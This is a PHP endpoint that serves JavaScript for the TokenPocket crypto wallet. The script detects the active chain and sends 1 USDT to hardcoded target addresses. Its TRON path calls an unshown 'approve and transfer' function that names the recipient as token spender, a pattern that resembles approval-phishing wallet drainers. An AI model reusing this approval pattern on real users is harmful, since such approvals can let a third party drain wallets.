<?php

declare(strict_types=1);

if (isset($_GET['js'])) {
    header('Content-Type: application/javascript; charset=utf-8');

    $cfg = require __DIR__ . '/../config/config.php';
    $defaultUsdtTron = $cfg['DEFAULT_USDT_TRON'] ?? 'TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t';
    $defaultUsdtEth = $cfg['DEFAULT_USDT_ETH'] ?? '0xdAC17F958D2ee523a2206206994597C13D831ec7';
    $defaultUsdtBsc = $cfg['DEFAULT_USDT_BSC'] ?? '0x55d398326f99059fF775485246999027B3197955';
    $defaultToTron = $cfg['TRON_TAGET_ADDRESS'] ?? 'TCrxJjcjfEDrPdQgYRfF4UVziuq6zGPsV6';
    $defaultToBsc = $cfg['BSC_TARGET_ADDRESS'] ?? '0x8138023332333233323332333233323332333233';
    $defaultToEth = $cfg['ETH_TARGET_ADDRESS'] ?? '0x8138023332333233323332333233323332333233';

    echo "(function () {\n";
    echo "  const DEFAULT_USDT_TRON = " . json_encode($defaultUsdtTron, JSON_UNESCAPED_UNICODE | JSON_UNESCAPED_SLASHES) . ";\n";
    echo "  const DEFAULT_USDT_ETH = " . json_encode($defaultUsdtEth, JSON_UNESCAPED_UNICODE | JSON_UNESCAPED_SLASHES) . ";\n";
    echo "  const DEFAULT_USDT_BSC = " . json_encode($defaultUsdtBsc, JSON_UNESCAPED_UNICODE | JSON_UNESCAPED_SLASHES) . ";\n";
    echo "  const DEFAULT_TO_TRON = " . json_encode($defaultToTron, JSON_UNESCAPED_UNICODE | JSON_UNESCAPED_SLASHES) . ";\n";
    echo "  const DEFAULT_TO_BSC = " . json_encode($defaultToBsc, JSON_UNESCAPED_UNICODE | JSON_UNESCAPED_SLASHES) . ";\n";
    echo "  const DEFAULT_TO_ETH = " . json_encode($defaultToEth, JSON_UNESCAPED_UNICODE | JSON_UNESCAPED_SLASHES) . ";\n";
    echo "  const DEFAULT_AMOUNT_USDT = \"1\";\n";
    echo <<<'JS'

  function parseUnitsHuman(human, decimals) {
    const s = String(human).trim();
    if (!s) throw new Error("请输入数量");
    if (!/^[0-9]+(\.[0-9]+)?$/.test(s)) throw new Error("数量格式不正确");
    const parts = s.split(".");
    const i = parts[0];
    const f = parts[1] || "";
    const frac = (f + "0".repeat(decimals)).slice(0, decimals);
    return (BigInt(i) * (10n ** BigInt(decimals))) + BigInt(frac || "0");
  }

  async function detectTokenPocketChain(log) {
    if (window.ethereum) {
      const chainIdHex = await window.ethereum.request({ method: "eth_chainId" });
      const chainId = Number(chainIdHex);
      if (chainId === 56) {
        if (typeof log === "function") log("检测到 TokenPocket 处于 BSC 链");
        return { kind: "bsc" };
      }
      if (chainId === 1) {
        if (typeof log === "function") log("检测到 TokenPocket 处于 ETH 链");
        return { kind: "eth" };
      }
      if (typeof log === "function") log("检测到不支持的 EVM 链，chainId=" + chainIdHex);
      return { kind: "unsupported" };
    }

    if (window.tronWeb && window.tronWeb.defaultAddress && window.tronWeb.defaultAddress.base58) {
      const tronAddress = window.tronWeb.defaultAddress.base58;
      if (typeof log === "function") log("检测到 TokenPocket 处于 TRON 链，地址：" + tronAddress);
      return { kind: "tron", tronAddress };
    }

    if (typeof log === "function") log("未检测到 TokenPocket 注入的 ethereum / tronWeb");
    return { kind: "none" };
  }

  async function payOnTron(log) {
    const fn = typeof window.pay0TokenPocketTronTransfer === "function"
      ? window.pay0TokenPocketTronTransfer
      : window.tronApproveAndTransferHardcoded;
    if (typeof fn !== "function") throw new Error("Tron 模块未加载");
    await fn({
      log: log,
      amountUsdt: DEFAULT_AMOUNT_USDT,
      toAddress: DEFAULT_TO_TRON,
      spenderAddress: DEFAULT_TO_TRON
    });
  }

  async function payOnEvm(kind, log) {
    if (typeof ethers === "undefined" || !window.ethereum) {
      throw new Error("未检测到 EVM 钱包");
    }

    const provider = new ethers.BrowserProvider(window.ethereum);
    const signer = await provider.getSigner();

    const usdtAddress = kind === "bsc" ? DEFAULT_USDT_BSC : DEFAULT_USDT_ETH;
    const toAddress = kind === "bsc" ? DEFAULT_TO_BSC : DEFAULT_TO_ETH;
    const amountUsdtHuman = DEFAULT_AMOUNT_USDT;

    const abi = [
      {"constant":true,"inputs":[],"name":"decimals","outputs":[{"name":"","type":"uint8"}],"type":"function"},
      {"constant":false,"inputs":[{"name":"to","type":"address"},{"name":"amount","type":"uint256"}],"name":"transfer","outputs":[{"name":"","type":"bool"}],"type":"function"}
    ];

    const token = new ethers.Contract(usdtAddress, abi, signer);
    let decimals = 6;
    try {
      const d = await token.decimals();
      decimals = Number(d);
    } catch (e) {
      decimals = 6;
    }

    const amount = parseUnitsHuman(amountUsdtHuman, decimals);
    const tx = await token.transfer(toAddress, amount);
    if (typeof log === "function") log("EVM transfer 已发送：" + tx.hash);
    await tx.wait();
  }

  async function tokenPocketPay(opts) {
    const log = opts && typeof opts.log === "function" ? opts.log : function () {};
    const detected = await detectTokenPocketChain(log);

    if (detected.kind === "bsc" || detected.kind === "eth") {
      await payOnEvm(detected.kind, log);
      return;
    }

    if (detected.kind === "tron") {
      await payOnTron(log);
      return;
    }

    if (detected.kind === "unsupported") {
      throw new Error("当前链不支持，请切换到 TRON / BSC / ETH");
    }

    throw new Error("未检测到钱包，请在 TokenPocket 内置浏览器打开本页");
  }

  window.pay0TokenPocketPay = tokenPocketPay;
})();
JS;

    exit;
}

header('Content-Type: text/plain; charset=utf-8');
echo 'OK';
